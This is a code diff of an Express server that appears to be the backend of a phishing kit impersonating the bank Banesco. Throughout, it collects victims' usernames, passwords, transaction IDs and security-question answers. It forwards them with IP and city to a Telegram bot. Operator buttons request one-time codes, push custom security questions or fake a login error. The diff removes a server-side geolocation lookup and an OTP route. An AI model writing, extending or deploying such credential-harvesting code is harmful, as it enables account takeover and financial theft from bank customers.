@@ -21,20 +21,8 @@ function guardarEstado() {
   fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
 }
 
-async function obtenerCiudad(ip) {
-  try {
-    const response = await fetch(`https://ipinfo.io/${ip}/json`);
-    const data = await response.json();
-    return data.city || 'Ciudad desconocida';
-  } catch {
-    return 'Ciudad desconocida';
-  }
-}
-
 app.post('/enviar', async (req, res) => {
-  const { usar, clavv, txid } = req.body;
-  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
-  const ciudad = await obtenerCiudad(ip);
+  const { usar, clavv, txid, ip, ciudad } = req.body;
 
   const mensaje = `
 🟢B4N3SC0🟢
@@ -86,11 +74,10 @@ app.post('/enviar2', async (req, res) => {
     pregunta1,
     pregunta2,
     respuesta1,
-    respuesta2
+    respuesta2,
+    ip,
+    ciudad
   } = req.body;
-
-  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
-  const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
 ❓🔑🟢B4N3SC0🟢
@@ -101,55 +88,6 @@ app.post('/enviar2', async (req, res) => {
 
 ${pregunta1}❓ : ${respuesta1}
 ${pregunta2}❓ : ${respuesta2}
-
-🌐 IP: ${ip}
-🏙️ Ciudad: ${ciudad}
-`;
-
-  const keyboard = {
-    inline_keyboard: [
-      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
-      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
-    ]
-  };
-
-  clientes[txid].status = "esperando";
-  guardarEstado();
-
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: mensaje,
-      parse_mode: 'HTML',
-      reply_markup: keyboard
-    })
-  });
-
-  res.sendStatus(200);
-});
-
-app.post('/enviar3', async (req, res) => {
-  const {
-    usar,
-    clavv,
-    txid,
-    dinamic
-  } = req.body;
-
-  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
-  const ciudad = await obtenerCiudad(ip);
-
-  const mensaje = `
-🔑🟢B4N3SC0🟢
-🆔 ID: <code>${txid}</code>
-
-📱 US4R: ${usar}
-🔐 CL4V: ${clavv}
-
-🔑0TP: ${dinamic}
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
@@ -199,7 +137,8 @@ app.post('/webhook', async (req, res) => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: message.chat.id,
-          text: `⚠️ Formato inválido. Usa:\n/${txid} ¿Pregunta1?&¿Pregunta2?`
+          text: `⚠️ Formato inválido. Usa:
+/${txid} ¿Pregunta1?&¿Pregunta2?`
         })
       });
       return res.sendStatus(200);
@@ -214,7 +153,9 @@ app.post('/webhook', async (req, res) => {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: message.chat.id,
-        text: `✅ Preguntas guardadas para ${txid}\n1️⃣ ${pregunta1.trim()}\n2️⃣ ${pregunta2.trim()}`
+        text: `✅ Preguntas guardadas para ${txid}
+1️⃣ ${pregunta1.trim()}
+2️⃣ ${pregunta2.trim()}`
       })
     });
 
@@ -236,7 +177,8 @@ app.post('/webhook', async (req, res) => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: callback.message.chat.id,
-          text: `✍️ Escribe las 2 preguntas personalizadas para ${txid} separadas por "&".\n\nEjemplo:\n¿Dónde naciste?&¿Cuál es tu color favorito?`
+          text: `✍️ Escribe las 2 preguntas personalizadas para ${txid} .
+Ejemplo: /txid ¿Dónde naciste?&¿Cuál es tu color favorito?`
         })
       });
 
